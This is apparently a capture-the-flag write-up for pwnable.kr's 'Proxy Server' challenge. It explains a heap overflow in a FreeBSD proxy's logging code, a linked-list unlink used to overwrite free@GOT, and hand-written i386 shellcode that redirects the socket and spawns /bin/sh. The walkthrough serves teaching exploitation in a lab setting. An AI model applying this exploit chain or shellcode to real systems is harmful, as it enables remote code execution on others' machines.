# Pwnable.kr: Proxy Server

## Challenge Description
```
I made a multi-thread based HTTP proxy server written in C. 
It works fine for simple case, but it crashes occasionally.
Can you find me the bug?
(it has watchdog, proxy server will be respawned after crashing)

* uname -a of server : FreeBSD bsd32 9.1-RELEASE FreeBSD 9.1-RELEASE #0 r243826: Tue Dec  4 06:55:39 UTC 2012     root@obrian.cse.buffalo.edu:/usr/obj/usr/src/sys/GENERIC  i386

Download : http://pwnable.kr/bin/myproxy

Running at : nc pwnable.kr 9903
```

## Summary
The vulnerability for this challenge was very easy, but the environment was something that I was not used to. For debugging my exploit I set up a FreeBSD VM, which was not a simple step. Therefore I am sharing how I set up the debugging environment so that other people can do this rather quickly and without any time-wasting trial and errors.


## Setting up the debugging environment
Since the given binary is a x86 FreeBSD Binary we cannot run it or debug it on a linux machine. Therefore I used a FreeBSD VM on VMWare Player to debug and test my exploit.

1. Install VMWare player on your system.
2. Download the FreeBSD image and create a VM. (https://www.freebsd.org/where.html)
3. Install utils on the FreeBSD VM such as GDM3, Gnome3, FTP services and the target binary (myproxy)
Gnome is a GUI service that is not installed by default on the FreeBSD machine. To install this you must follow the instructions in the following link, as well as installing Xorg with `pkg install xorg`. (LINK: https://www.freebsd.org/doc/handbook/x11-wm.html)
4. When you install VMWare player a new network interface is created, probably named as vmnet[number]. Using this interface you can connect to services running on the virtual machine. This also means that you can test your exploit on your virtual machine by sending packets to ./myproxy running on the virutal machine using a pwntools script on your host. A good idea is to attach GDB to ./myproxy on the VM and run the exploit script on the host machine to look for crashes.


## The Vulnerability
There is a heap overflow in SaveLog function
```
void SaveLog(int fd, char *uri, int port)
{
  size_t v3;
  size_t uri_length;
  socklen_t len;
  struct sockaddr_in addr;
  log_entry *entry;
  log_entry *ptr;

  if ( nlog == 32 )
  {
    ptr = log_head->next;                      
    ptr->next->prev = ptr->prev;
    ptr->prev->next = ptr->next;                // unlink routine
    free(ptr);
    --nlog;
  }
  len = 16;
  if ( getpeername(fd, (struct sockaddr *)&addr, &len) == -1 )
  {
    perror("getpeername() failed");
  }
  else
  {
    if ( log_head )
    {
      entry = (log_entry *)malloc(0x88u);
      memset(entry, 0, 0x88u);
      entry->addr = addr.sin_addr.s_addr;
      entry->port = port;
      entry->prev = log_head;
      entry->next = log_head->next;
      uri_length = strlen(uri);
      strncpy(entry->uri, uri, uri_length);     // overflow
      log_head->next->prev = entry;             
      log_head->next = entry;
      log_head = entry;
    }
    else
    {
      log_head = (struct log_entry *)malloc(0x88u);
      memset(log_head, 0, 0x88u);
      v3 = strlen(uri);
      strncpy(log_head->uri, uri, v3);
      log_head->addr = addr.sin_addr.s_addr;
      log_head->port = port;
      log_head->prev = log_head;
      log_head->next = log_head;
    }
    ++nlog;
  }
}
```

struct log_entry is defined as the following:
```
struct log_entry{
  int addr;
  int port;
  char url[120];
  struct log_entry *prev;
  struct log_entry *next;
}
```

There must be a routine to check if uri's length is smaller than 120, but there isn't. We can overwrite the next and prev member variables of a new entry. Using the unlink feature when nlog == 32 we can acheive arbitrary write.

However we need a heap leak and for that we use the DumpLog function. If we set the uri to exactly 120 bytes we get a heap address.

## Exploit Plan
```
(1) Leak heap address via dumplog
(2) Create 31 entries and 1 specially crafted entry for the unlink feature (when nlog becomes 32). Using the unlink feature we get a near-arbitrary write.
```

The reason I said it was a near-arbitrary write is because we are using the code `ptr->next->prev = ptr->prev; ptr->prev->next = ptr->next;` and therefore ptr->next and ptr->prev must both be located in writable pages. We can set ptr->next to free@GOT - 0x80 and ptr->prev to shellcode address. Since shellcode is located in a RWX page this should work.

A more detailed exploit plan is the following:
```
(0) Leak the address of the first entry by creting an entry with url "A"*120 and dumping the log. Then, crash the server by causing a segfault. Let's call this leaked address H.

(1) Create a log entry with its url as fake_structure + shellcode. Therefore the shellcode must not contain any slashes('/'), null bytes, colons(':') or spaces(' ') because these are all cut out due to the URL parsing routine. Fake structure must look like (shellcode address)|(free_got - 0x80). shellcode_address can by calculated by H + 0x10. The address of this fake structure is H + 0x8.

(2) Create 39 dummy log entries.

(3) Create a log entry with its prev as fake structure address - 0x80. This will make ptr->prev become the shellcode_address and ptr->next become free_got-0x80. By the unlink routine free_got will be overwritten to be the shellcode address, and shellcode will be overwritten as well but as long as it isn't longer than 0x84 bytes it will not affect the exploit.

(4) Due to the free() call right afterwards shellcode will be executed.
```

## Placing Shellcode
The checksec for the binary is the following. Since NX is disabled and there are RWX segments a single EIP control can get us RCE. Proably overwriting a libc function's GOT with the shellcode address is an easy way to pwn this.
```
Arch:     i386-32-little
RELRO:    No RELRO
Stack:    No canary found
NX:       NX disabled
PIE:      No PIE (0x8048000)
RWX:      Has RWX segments

```

Before actually writing any shellcode, we need to think about our primitives. First where can we place the shellcode? We can place it either on the heap or the stack. (In my VM the heap was mapped as unexecutable even though NX was disabled in the binary. But in the remote condition the heap was executable, and I will explain how I figured this out) In the VM I leaked the stack buffer where the proxy server receives from the remote server, and set up a server that sends shellcode to anyone who connects to it. If a proxy server proxies a request to the server that I set up its stack will be filled up with shellcode. However, this kind of exploit was not possible in the remote condition since I did not know the stack address and bruteforcing it will take a long time. I just hoped the heap to be executable and it worked. How did I know it worked? I tested it using an infinite loop shellcode. You can generate an infinite loop shellcode with the following code.

```
context.os = 'freebsd'
context.arch = 'i386'

shellcode_d = shellcraft.i386.infloop()
shellcode = asm(shellcode_d).ljust(120,"\x90")
```
Actually there is no reason to pad it with NOP since we know the heap addresses already (No ASLR) but I just did it for no reason.

Using this shellcode I test my exploit, and compared the results with this shellcode (an instant crash shellcode):
```
context.os = 'freebsd'
context.arch = 'i386'

shellcode_d = shellcraft.i386.crash()
shellcode = asm(shellcode_d).ljust(120,"\x90")
```

On the exploit using the first shellcode the proxy server did not send an EOF but in the second exploit I got an immediate EOF after the 33rd entry was added. This means the heap is executable and we have shellcode RCE!

## Writing Shellcode
After some research I realized that FreeBSD's syscall convention was different with linux. In a linux x86 syscall convention the arguments are passed in ebx, ecx, edx,... registers. However in FreeBSD the registers are passed via the stack, as in x86 linux function calling conventions. Also we don't have access to the proxy server's stdin or stdout. We first need to dup2 fd 0 and 1 to the socket and pop a shell. How do we know the fd of the socket? We can bruteforce or guess or try all of them but a smart way to do this is to use the fd stored in the stack at [ebp+0x8] as a local variable. We can figure this out by analyzing the variable allocations in the disassembly. Now my full shellcode is the following (It took some time to write it since it had to avoid some characters)

The first part is to do dup2(sockfd, 1)

```
xor eax,eax
xor ebx,ebx
xor ecx,ecx
xor edx,edx
mov al,90
mov bl,[ebp+8]
mov cl,1
push ecx
push ebx
push eax
int 0x80
```

The first part is to do dup2(sockfd, 0)
```
xor eax,eax
xor ebx,ebx
xor ecx,ecx
xor edx,edx
mov al,90
mov bl,[ebp+8]
push ecx
push ebx
push eax
int 0x80
```

The last part is to call execve(["/bin//sh",NULL,NULL]). I XOR encoded "/bin//sh" with 0x11111111 since it contained slashes which was a forbidden character.
```
xor eax,eax
push eax
push 2036481598
pop ebp
xor ebp,0x11111111
push ebp
push 2138600254
pop ebp
xor ebp,0x11111111
push ebp
mov ecx,esp
push eax
push esp
push esp
push ecx
push eax
mov al,0x3b
int 0x80
```

Now we can get a flag, which I will not be posting here.

## Trivia
In my VM and in the remote condition ASLR was disabled. In the VM I looked at addresses with GDB and realized that it doesn't change every time I execute it. In the remote service the leaked heap address never changed. Therefore I guess a FreeBSD system has potentially more 'pwnable' properties compared to other operating systems like Windows or Ubuntu Linux which are more popular.